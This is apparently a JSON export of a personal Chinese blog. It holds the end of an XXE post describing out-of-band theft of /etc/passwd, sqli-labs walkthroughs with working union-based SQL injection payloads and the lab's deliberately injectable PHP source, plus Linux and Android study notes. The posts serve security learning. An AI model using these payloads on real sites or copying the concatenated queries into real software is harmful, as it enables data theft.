此时，调用的过程就变为：参数实体dtd通过http协议来访问服务器上的evil.xml，然后返回evil.xml的内容，调用了参数实体payload，然后payload又调用了参数实体send，send的作用就是把参数实体file（即文件/etc/passwd的base64编码内容）发送到我们的服务器上,解密base64编码内容即可； 但是，如果目标靶机不允许我们访问外网，那么就需要用到另一种方法：利用本地dtd文件重新定义参数实体产生报错从而回显信息。 +++ 参考：[1].https://nikoeurus.github.io/2019/11/06/XXE%E6%80%BB%E7%BB%93/#LookAround [2]. https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/ [3].https://www.freebuf.com/vuls/207639.html [4].https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2","categories":[],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://singlemindedt.github.io/tags/XXE/"}]},{"title":"操作系统安全","slug":"操作系统安全","date":"2020-02-28T02:26:23.000Z","updated":"2020-02-28T05:06:58.773Z","comments":true,"path":"2020/02/28/操作系统安全/","link":"","permalink":"https://singlemindedt.github.io/2020/02/28/操作系统安全/","excerpt":"","text":"","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Linux操作系统","slug":"Linux操作系统","date":"2020-02-28T01:29:23.000Z","updated":"2020-03-06T01:49:44.534Z","comments":true,"path":"2020/02/28/Linux操作系统/","link":"","permalink":"https://singlemindedt.github.io/2020/02/28/Linux操作系统/","excerpt":"","text":"第四讲用户组文件普通用户管理1.添加用户命令:useradd2.更改用户口令命令：passwd 在创建Linux分区时,一定要创建两个分区:SWAP/ROOT 3.who -u查已登录到系统的用户进程4.kill -9 进程号 su/sudo(受限的su,更安全；授权许可的su,配置文件/etc/sudoers) shell编程 Python表达式中，可以使用（ ）控制运算符的优先顺序。 userdel myname 注：删除用户myname，但不删除其home目录及文件； userdel -r myname 注：删除用户mynamt，其home目录及其他文件一并删除；","categories":[],"tags":[]},{"title":"sqli-labs-Page-1-Less-4","slug":"sqli-labs-Page-1-Less-4","date":"2020-02-26T10:41:44.000Z","updated":"2020-02-27T01:14:49.915Z","comments":true,"path":"2020/02/26/sqli-labs-Page-1-Less-4/","link":"","permalink":"https://singlemindedt.github.io/2020/02/26/sqli-labs-Page-1-Less-4/","excerpt":"","text":"Less-4（GET方式-基于双引号-string型）根据页面提示： 1Please input the ID as parameter with numeric value 尝试通过get方式输入ID和数值参数：?id=1 成功得到查询结果； 添加单引号：?id=1’ 语句正常执行； 添加双引号：?id=1“ 出现了报错信息，仔细观察信息，可以看到报错信息里出现了多个双引号和一个圆括号，猜测可能为(“”)闭合方式； 添加双引号+）：?id=1“） 看到出现了报错结果，错误就在”）附近； 添加双引号+）–+：?id=1“）–+ 成功查询到结果，基本可以确定为(“”)闭合方式； 尝试输入?id=1“）and 1=2–+ 可以看到既无报错信息也没有回显任何内容，说明我们所输入的语法是对的，在1=2上存在逻辑错误，即SELECT * FROM users WHERE id=(“1”)and 1=2--+”) LIMIT 0,1； 尝试输入?id=1”）and 1=1–+ 成功得到查询内容与?id=1“）–+结果一致，即语法和逻辑均正确，说明此处确为(“”)字符型注入； ==猜解数据库内容==猜解过程与Page-1-Less-3基本相同，只是在原来的基础上将‘改为”，此处仅举一例；例：利用显示位爆破数据库名：?id=-1”) union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ 成功得到查询结果； 查看源码：可以看到查询语句的格式为：$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;//将ID变量与“连接；构成新的ID；$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;; 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $id = '\"' . $id . '\"';$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[]},{"title":"sqli-labs-Page-1-Less-3","slug":"sqli-labs-Page-1-Less-3","date":"2020-02-25T02:25:38.000Z","updated":"2020-02-27T01:15:51.677Z","comments":true,"path":"2020/02/25/sqli-labs-Page-1-Less-3/","link":"","permalink":"https://singlemindedt.github.io/2020/02/25/sqli-labs-Page-1-Less-3/","excerpt":"","text":"Less-3 （GET方式-基于单引号变形-string型）根据页面提示： 1Please input the ID as parameter with numeric value 尝试通过get方式输入ID和数值参数：?id=1 成功得到查询结果； 添加单引号：?id=1’ 得到报错信息，即我们所输入的单引号与查询语句格式不匹配，从报错信息还可以看出可能与’）‘有关，猜测可能为单引号多余或者闭合格式为（’‘）造成； 加入注释符：?id=1’–+ 可以看出还是回显报错信息，并且错误之处还是在单引号附近； 加单引号+）+注释符 ?id=1’）–+ 看到成功得到查询内容，所以该处的闭合方式为(‘’); 尝试输入?id=1’）and 1=2–+ 可以看到既无报错信息也没有回显任何内容，说明我们所输入的语法是对的，在1=2上存在逻辑错误，即SELECT * FROM users WHERE id=(&#39;1&#39;)and 1=2--+&#39;) LIMIT 0,1； 尝试输入?id=1’）and 1=1–+ 成功得到查询内容，说明此处确为(‘’)字符型注入； ==猜解数据库内容==猜解过程与Page-1-Less-1基本相同，只是在原来的基础上加一个“)”，此处仅举一例；例：数据库版本，库名：?id=-1’) union select 1,version(),database() –+ 成功得到结果； 查看源码：可以看到查询语句的格式为：SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-2","slug":"sqli-labs-Page-1-Less-2","date":"2020-02-20T08:45:57.000Z","updated":"2020-02-27T15:02:18.817Z","comments":true,"path":"2020/02/20/sqli-labs-Page-1-Less-2/","link":"","permalink":"https://singlemindedt.github.io/2020/02/20/sqli-labs-Page-1-Less-2/","excerpt":"","text":"Less-2（GET方式-基于整型） 根据页面提示： 1Please input the ID as parameter with numeric value 尝试通过get方式输入ID和数值参数：?id=1 可以看到给出了相应的login name 和password; 再添加一个单引号看看：?id=1’ 12错误信息： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 这时sql语句出错，程序无法正常从数据库中查询出数据，抛出异常； 添加and 1=1；?id=1 and 1=1 可看到命令执行正常，返回了查询结果； 加单引号+and 1=1?id=1’ and 1=1 可以看到语句报错，抛出异常； 添加and 1=2?id=1 and 1=2 可以看到语句正常执行，但是无返回结果，即从此处就可以看出，语句正确，但是逻辑错误，所以返回错误，所以此处为整型注入。 ==接下来按流程猜解数据库内容：==*由于该数据库并没有其他限制语句，故此例省略注释符– *1.猜解数据库表列数?id=1 order by 3 order by 3页面回显正常;[25]:()order by 4页面回显报错,故该表共有3列； 2.判断数据显示位?id=-1 union select 1,2,3[26]:()得到有2，3两个显示位； 3.利用显示位爆破数据库版本及数据库名?id=-1 union select 1,version(),database()[27]:()爆出，version：5.5.53，database：security； 查询所有数据库名： ?id=-1 union select 1,(select group_concat(schema_name)from information_schema.schemata),3–+[28]:()得到8个数据库，分别为：information_schema,challenges,dvwa,easysql,mysql,performance_schema,security,test; 4.利用显示位爆破表名，此处我们查mysql数据库中的表名?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’mysql’),3–+[29]:()得到很多表，此处不一一列举； 5.利用显示位爆破列名，此处我们查询db表里的列?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’db’),3–+[30]:()得到很多列，此处不一一列举； 6.利用显示位爆破字段，此处我们查询db表中Host和User ?id=-1 union select 1,(select group_concat(Host) from mysql.db),(select group_concat(User) from mysql.db)–+ 得到Host内容%，%；User：，；查看源码：查询语句为：SELECT * FROM users WHERE id=$id LIMIT 0,1，确为整型注入； 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\"; &#125;?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"移动应用开发","slug":"移动应用开发","date":"2020-02-20T06:53:26.000Z","updated":"2020-07-29T12:59:41.740Z","comments":true,"path":"2020/02/20/移动应用开发/","link":"","permalink":"https://singlemindedt.github.io/2020/02/20/移动应用开发/","excerpt":"","text":"[TOC] 题型： 选择题20 x 1 程序填空题3 x 10 简答题 4 x 5(原理性) 编程题 2 x 15 +++ 重点：第四章：Activity +++ +++ 显示启动/隐式启动、 +++ +++ +++ 创建流程、 生命周期、 随着Activity自身状态的变化，Android系统会调用不同的事件回调函数(7个)： activity之间数据的传递 intent的作用、组成部分7个 布局 布局管理（第3、5章） 线性、相对、Constraintlayout布局管理器 事件监听 基于监听的事件处理（使用匿名内部类添加事件监听器、使用Activity作为事件监听器） 菜鸟 基于回调的事件处理（使用继承的方式） 回调：将功能定义与功能分开的一种手段 Android基于回调的事件处理，主要做法是重写Android组件特定的回调方法，或者重写Activity的方法。 核心就是事件传播的顺序 监听器优先，然后到View组件自身，最后再到Activity；返回值false继续传播，true终止传播~！ Handler消息传递机制（多线程环境、产生Handler的原因） +++ +++ 小知识点第十章： service（绑定启动）、ContentProvider存储数据、、、 +++ 1234&gt; &gt; ContentProvider使用的URI语法结构如下&gt; &gt; 1 content://&lt;authority&gt;/&lt;data_path&gt;/&lt;id&gt;&gt; &gt; &gt; &gt; Fragment(碎片)是activity的界面中的一部分或一种行为。你可以把多个Fragment们组合到一个activity中来创建一个多面界面，并且你可以在多个activity中重用一个Fragment。你可以把Fragment认为模块化的一段activity，它具有自己的生命周期，接收它自己的事件，并可以在activity运行时被添加或删除。Fragment不能独立存在，它必须嵌入到activity中，而且Fragment的生命周期直接受所在的activity的影响。 十三章资源 ShapeDrawable、GradientDrawable、AnmationDrawable、StateListDrawable(利用xml来表示图形) ShapeDrawable:形状的Drawable咯,定义基本的几何图形,如(矩形,圆形,线条等),根元素是&lt;shape../&gt; 节点比较多 GradientDrawable:一个具有渐变区域的Drawable，可以实现线性渐变,发散渐变和平铺渐变效果 核心节点： AnmationDrawable:用来实现Android中帧动画的,就是把一系列的 Drawable，按照一定得顺序一帧帧地播放； 使用作为根节点 oneshot:设置是否循环播放,false为循环播放! duration:帧间隔时间,通常我们会设置为300毫秒 我们获得AniamtionDrawable实例后，需要调用它的start()方法播放动画， StateListDrawable:通过使用在同一图像区域使用不同的图片，来表示一个对象的 不同状态。selector,这个是必须要有的根元素 第六章高级控件 通过适配器填充、、、Listview ： ListView展示数据的原理 在Android中，其实ListView就相当于web中的jsp,Adapter是适配器，它就相当于web中的Servlet, 适配器的作用 Adapter的作用就是把数据展示在Listview中 安装打包APK基本控件字符串统一修改res-&gt;values-&gt;strings.xml统一修改，防止之后修改任务量巨大的问题（其他文件字符串部分通过调用strings.xml文件内容实现，如： android:label=”@string/app_name”）+++++==Android中的三个重要文件== 1.Activity是一个类； 2.Layout文件xml文件； 3.Manifest配置文件+++++==Andeoid中的View组件==1.TextView2.Button3.Edittext4.图片视图组件ImageView5.单选按钮组件RadioGroup6.复选框组件CheckBox 4.界面布局（布局管理器） 1.线性布局管理器LinearLayout:smile: Weight用法 ：0dp、WrapContent、match_parent 2.相对布局管理器RelativeLayout*:smile: 3.框架布局管理器FrameLayout 4.表格布局管理器TableLayout 5.网格布局管理器GridLayout（ConstraintLayout管理器） 第4章 Activity Activity类是与用户具体的交互界面； R.java是项目中所有资源的索引文件，资源以（资源id，值）形式存放在对应的内部类中； Activity生命周期； +++ 1. 第一个Android应用 文件中的所有Activity都需要在AndroidManifest.xml文件中注册一下才可使用； 在MainActivity里查看布局文件，可直接按住Ctrl点击layout文件名，直接转到相应文件； 2. UI组件2-1布局管理器代码区域：res-&gt;layout-&gt;activity_main.xml 线性布局1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" tools:context=\".MainActivity\" android:orientation=\"vertical\"&gt; &lt;!--+id即表示创建一个id--&gt; &lt;!-- --&gt; &lt;!--orientation=\"vertical\"表示水平方向排列 --&gt; &lt;!--layout_marginTop=\"20dp\"间距 --&gt; &lt;!--gravity=\"center\"本布局内新建布局位置为中间--&gt; &lt;LinearLayout android:id=\"@+id/ll_1\" android:background=\"#000000\" android:layout_width=\"200dp\" android:layout_height=\"200dp\" android:orientation=\"vertical\" android:paddingRight=\"20dp\" android:paddingLeft=\"20dp\" android:paddingBottom=\"20dp\" android:paddingTop=\"20dp\"&gt; &lt;View android:layout_width=\"200dp\" android:layout_height=\"200dp\" android:background=\"#DFB761D6\" /&gt; &lt;/LinearLayout&gt;&lt;LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"200dp\" android:orientation=\"horizontal\" android:background=\"#0066FF\" android:layout_marginTop=\"20dp\" android:layout_marginLeft=\"15dp\" android:layout_marginRight=\"15dp\" &gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#8BC34A\" android:layout_weight=\"1\"/&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#00BCD4\" android:layout_weight=\"1\" /&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#E91E63\" android:layout_weight=\"1\" /&gt;&lt;/LinearLayout&gt; &lt;!--layout_weight=\"1\"将剩余内容按权重平分--&gt; &lt;LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"250dp\" android:orientation=\"horizontal\" android:background=\"#0066FF\" android:layout_marginTop=\"20dp\" android:layout_marginLeft=\"15dp\" android:layout_marginRight=\"15dp\" &gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:layout_weight=\"1\" android:background=\"#8BC34A\" /&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#00BCD4\" android:layout_weight=\"1\" /&gt; &lt;View android:layout_width=\"0dp\" android:layout_height=\"50dp\" android:background=\"#E91E63\" android:layout_weight=\"1\" /&gt; &lt;/LinearLayout&gt;&lt;/LinearLayout&gt; 相对布局12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\"&gt; &lt;!--+id即表示创建一个id,其后跟的名字是自定义的；--&gt; &lt;!-- --&gt; &lt;!--layout_alignParentBottom=\"true\"与父空间底部对齐--&gt; &lt;!--layout_toRightOf=\"@id/view_2\"使view_3处于view_2的右边--&gt; &lt;!--各种布局可嵌套使用 --&gt; &lt;!--layout_below=\"@id/view_3\"使线性布局的ll_1位于view_3的下方 --&gt; &lt;!--layout_marginLeft=\"20dp\"设置view_5的左外边距为20dp --&gt; &lt;View android:id=\"@+id/view_1\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#03A9F4\" android:layout_alignParentBottom=\"true\" android:layout_alignParentRight=\"true\"/&gt; &lt;View android:id=\"@+id/view_2\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#CDDC39\" android:layout_alignParentTop=\"true\" android:layout_alignParentLeft=\"true\"/&gt; &lt;View android:id=\"@+id/view_3\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#E91E63\" android:layout_toRightOf=\"@id/view_2\"/&gt; &lt;LinearLayout android:id=\"@+id/ll_1\" android:layout_width=\"match_parent\" android:layout_height=\"200dp\" android:layout_below=\"@id/view_3\" android:orientation=\"horizontal\" android:background=\"#673AB7\" android:padding=\"15dp\"&gt; &lt;View android:layout_width=\"100dp\" android:layout_height=\"match_parent\" android:background=\"#FF5722\"/&gt; &lt;RelativeLayout android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:background=\"#4CAF50\" android:padding=\"10dp\"&gt; &lt;View android:id=\"@+id/view_4\" android:layout_width=\"100dp\" android:layout_height=\"match_parent\" android:background=\"#009688\"/&gt; &lt;View android:id=\"@+id/view_5\" android:layout_width=\"100dp\" android:layout_height=\"match_parent\" android:background=\"#FFEB3B\" android:layout_toRightOf=\"@id/view_4\" android:layout_marginLeft=\"20dp\"/&gt; &lt;/RelativeLayout&gt; &lt;/LinearLayout&gt; &lt;/RelativeLayout&gt; 12android:layout_below属性会将当前控件的顶部置于给定ID的控件之下，但并不会与给定ID的控件对齐，默认会放在父控件的最左边；可通过android:layout_alignLeft、android:layout_alignRight等对齐属性改变当前控件 TextView主界面创建Button组件： 新建TextViewActivity界面，并在Manifest中注册： 在MainActivity中声明，并为Button设置事件监听机制（点击按钮，界面会由MainActivity跳转到TextViewActivity）； 在activity_text_view.xml布局文件中添加几个TextView以满足不同效果，效果图及代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" android:padding=\"20dp\"&gt; &lt;TextView android:id=\"@+id/tv_1\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test1\" android:textColor=\"#00BCD4\" android:textSize=\"24sp\"/&gt; //text=\"@string/tv_test1\"引用之前在values下的strings中的名字，则会显示对应编辑的文字内容 //也可以直接写文字内容android:text=\"小黑戴白帽\" &lt;TextView android:id=\"@+id/tv_2\" android:layout_width=\"100dp\" android:layout_height=\"wrap_content\" android:maxLines=\"1\"//一行显示 android:ellipsize=\"end\"//多余内容在结尾处以省略号形式展示 android:text=\"@string/tv_test2\" android:textColor=\"#F44336\" android:textSize=\"24sp\"/&gt; &lt;TextView android:id=\"@+id/tv_3\" android:layout_width=\"wrap_content\" android:layout_height=\"34dp\" android:drawableRight=\"@drawable/ic_launcher_foreground\"//引用图标（图片中不太明显，白色Android机器人图标） android:text=\"@string/tv_test3\" android:textColor=\"#673AB7\" android:textSize=\"24sp\" /&gt; &lt;TextView android:id=\"@+id/tv_4\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test4\" android:textColor=\"#E91E63\" android:textSize=\"24sp\"/&gt; &lt;TextView android:id=\"@+id/tv_5\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test5\" android:textColor=\"#4CAF50\" android:textSize=\"24sp\"/&gt; &lt;TextView android:id=\"@+id/tv_6\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test6\" android:textColor=\"#3F51B5\" android:textSize=\"24sp\"/&gt; //跑马灯 &lt;TextView android:id=\"@+id/tv_7\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@string/tv_test7\" android:textColor=\"#2196F3\" android:textSize=\"24sp\" android:singleLine=\"true\"//单行 android:ellipsize=\"marquee\" android:marqueeRepeatLimit=\"marquee_forever\"//循环次数 android:focusable=\"true\"//获取焦点 android:focusableInTouchMode=\"true\"/&gt;&lt;/LinearLayout&gt; 下划线、中划线等操作需要在TextView中编辑代码实现： 注：strings.xml中的内容： Button 文字大小、颜色 自定义背景形状 自定义按压效果 点击事件 流程： 在activity_main.xml中创建控件后，需要在MainActivity.java中声明控件，并在protected void onCreate()函数中明确控件id； 添加事件监听，跳转语句，新建演示Button的活动页面（ButtonActivity）； 在Manifest中注册，Androidstudio已经帮我们自动生成； 1&lt;activity android:name=\".ButtonActivity\"&gt;&lt;/activity&gt; 其中”.”的含义指包名，即package=”com.example.helloworld”，从文件夹上也可看出ButtonActivity属于com.example.helloworld这个包； 设置Button控件大小、颜色、背景等属性 自定义控件形状 在drawable文件下新建DrawableResourceFile文件，并将Root element参数修改为shape； 修改新建的bg_btn2.xml文件内容，将形状设为圆角 在activity_button.xml中修改btn_2的背景为 1android:background=\"@drawable/bg_btn2\" 实际上就是把背景换为带圆角的形状； 新建一个Button只有描边，里面是白色 在drawable文件下新建DrawableResourceFile文件，并将Root element参数修改为shape；（或者直接复制刚才的bg_btn2.xml，将名字改为bg_btn3.xml） 修改新建的bg_btn3.xml文件内容，删除实体属性 12&lt;solid android:color=\"#4CAF50\"/&gt; 增加描边 123&lt;stroke android:width=\"1dp\" android:color=\"#4CAF50\"/&gt; 在activity_button.xml中修改btn_3的背景为 1android:background=\"@drawable/bg_btn3\" 设置按压效果（触摸变色） 在activity_button.xml中新建控件btn_4设置基本属性 在drawable文件下新建DrawableResourceFile文件，并将Root element参数修改为selector； 修改新建的bg_btn4.xml文件内容，设置按压情况属性和伟岸压下属性 在activity_button.xml中修改btn_4的背景为 1android:background=\"@drawable/bg_btn4\" 点击事件 直接在刚创建的Button4里编辑，添加 1android:onClick=\"showToast\" 即添加了一个showToast方法； 在ButtonActivity.java中添加showToast方法的代码 1234public void showToast(View view)&#123;Toast.makeText(this,\"btn4被点击了\",Toast.LENGTH_SHORT).show();//弹出提示信息&#125; 此时运行模拟器已经能出现事件响应了，点击Button4会出现提示“btn4被点击了”； 事件点击2（常用） 直接在ButtonActivity.java添加代码以实现 以Button3为例，因为要使用Button3，故需声明控件，设置控件id（以被找到） 添加事件监听代码 123456mBtn3.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(ButtonActivity.this,\"btn3被点击了\",Toast.LENGTH_SHORT).show();//弹出提示信息 &#125;&#125;); 其中 1Toast.makeText(ButtonActivity.this,\"btn3被点击了\",Toast.LENGTH_SHORT).show();//弹出提示信息 该方法与之前btn4的基本一致，只是修改了this的指向； 给textview设置点击事件 先在activity_Button.xml中创建一个textview控件 之后过程与“点击事件2”方法一致 ButtonActivity.java 12345678910111213141516171819202122232425262728293031323334353637383940package com.example.helloworld;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;import android.widget.Toast;public class ButtonActivity extends AppCompatActivity &#123; private Button mBtn3; private TextView mTv1; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_button); mBtn3=findViewById(R.id.btn_3); mBtn3.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(ButtonActivity.this,\"btn3被点击了\",Toast.LENGTH_SHORT).show();//弹出提示信息 &#125; &#125;); mTv1=findViewById(R.id.tv_1); mTv1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(ButtonActivity.this,\"tv1被点击了\",Toast.LENGTH_SHORT).show();//弹出提示信息 &#125; &#125;); &#125; public void showToast(View view)&#123; Toast.makeText(this,\"btn4被点击了\",Toast.LENGTH_SHORT).show();//弹出提示信息 &#125;&#125; MainActivity.java 123456789101112131415161718192021222324252627282930313233343536373839package com.example.helloworld;import androidx.appcompat.app.AppCompatActivity;import android.content.Intent;import android.os.Bundle;import android.view.View;import android.widget.Button;//Button的包，若没有则在private Button mBtnTextView;中点击button按住Alt+Enterpublic class MainActivity extends AppCompatActivity &#123; private Button mBtnTextView; //声明Button，（mBtnTextView为设置的变量名，Android规范第一个字母小写）因为我们在activity_main.xml中创建了一个Button； private Button mBtnButton;//声明空间Button @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //代码只能添加在上面两行的后面，否则程序异常退出 mBtnTextView=findViewById(R.id.btn_textview);//在布局文件中找到对应Button组件的id； mBtnTextView.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; //事件监听，点击按钮时跳转到TextView演示界面 Intent intent=new Intent(MainActivity.this,TextViewActivity.class);//指定跳转目标 startActivity(intent); &#125; &#125;); mBtnButton=findViewById(R.id.btn_button); mBtnButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; //跳转到Button演示界面 Intent intent=new Intent(MainActivity.this,ButtonActivity.class);//指定跳转目标 startActivity(intent); &#125; &#125;); &#125;&#125; activity_button.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:padding=\"10dp\" &gt; &lt;Button android:id=\"@+id/btn_1\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"按钮1\" android:textSize=\"20sp\" android:textColor=\"#E91E63\" android:background=\"#FFC107\"/&gt; &lt;Button android:id=\"@+id/btn_2\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"按钮2\" android:textSize=\"20sp\" android:textColor=\"#E91E63\" android:background=\"@drawable/bg_btn2\" android:layout_below=\"@+id/btn_1\" android:layout_marginTop=\"10dp\"/&gt; &lt;Button android:id=\"@+id/btn_3\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"按钮3\" android:textSize=\"20sp\" android:textColor=\"#4CAF50\" android:layout_below=\"@id/btn_2\" android:layout_marginTop=\"10dp\" android:background=\"@drawable/bg_btn3\"/&gt; &lt;Button android:id=\"@+id/btn_4\" android:layout_width=\"match_parent\" android:layout_height=\"40dp\" android:text=\"按钮4\" android:textSize=\"20sp\" android:textColor=\"#E91E63\" android:layout_below=\"@id/btn_3\" android:layout_marginTop=\"10dp\" android:background=\"@drawable/bg_btn4\" android:onClick=\"showToast\"/&gt; &lt;TextView android:id=\"@+id/tv_1\" android:layout_width=\"match_parent\" android:layout_height=\"50dp\" android:textColor=\"#F44336\" android:textSize=\"20sp\" android:text=\"文字1\" android:layout_below=\"@id/btn_4\" android:layout_marginTop=\"40dp\" android:background=\"#CDDC39\" android:gravity=\"center\"/&gt;&lt;/RelativeLayout&gt;&lt;!-- android:layout_below=\"@+id/btn_1\"//使btn_2位于btn_1的下方 android:layout_marginTop=\"10dp\"//使btn_2的上方间距10dp android:gravity=\"center\"//内容对其方式，设为center，即“文字1”剧中显示--&gt; 效果： 完整代码： https://download.csdn.net/download/qq_40638006/12363386 +++ EditText 常用属性 监听事件 制作登陆界面 流程： 在activity_main.xml中创建Button，设置id为btn_edittext; 在MainActivity.java中注册； 1private Button mBtnEditTxet; 找到控件id 1mBtnEditTxet=findViewById(R.id.btn_edittext);//在布局文件中找到对应Button组件的id； 设置监听事件 1234567mBtnEditTxet.setOnClickListener(new View.OnClickListener() &#123;//事件监听 @Override public void onClick(View v) &#123; //跳转到EditText演示界面 &#125; &#125;); 在onClick方法中填写跳转内容： 12345public void onClick(View v) &#123; //跳转到EditText演示界面 Intent intent=new Intent(MainActivity.this,EditTextActivity.class);//指定跳转目标 startActivity(intent);&#125; 此时的EditTextActivity我们还没有创建，故需要新建一个；新建的Activity都需要在manifest中声明一下，Android studio已经帮我们自动声明了； 在对应的布局文件activity_edit_text.xml中设计布局EditText样式属性 由于目前版本默认输入框为一根横线，为好看起见我们利用之前Button中的方法也将其设置为圆角或描边样式 直接拷贝一份之前的bg_btn3.xml文件，修改名称为bg_username.xml; 然后再EditText控件中修改background即可； 1android:background=\"@drawable/bg_username\" 设置图标 